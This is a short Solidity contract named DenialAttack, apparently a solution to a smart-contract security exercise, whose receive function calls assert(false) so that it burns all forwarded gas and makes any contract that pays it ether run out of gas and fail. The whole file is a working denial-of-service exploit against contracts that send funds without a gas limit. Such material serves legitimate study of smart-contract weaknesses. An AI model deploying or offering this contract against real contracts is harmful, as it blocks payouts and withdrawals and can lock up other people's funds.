// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttack {
    receive() external payable {
        assert(false); //consume all gas,not refund make the call contract run out of gas and throw error
    }
}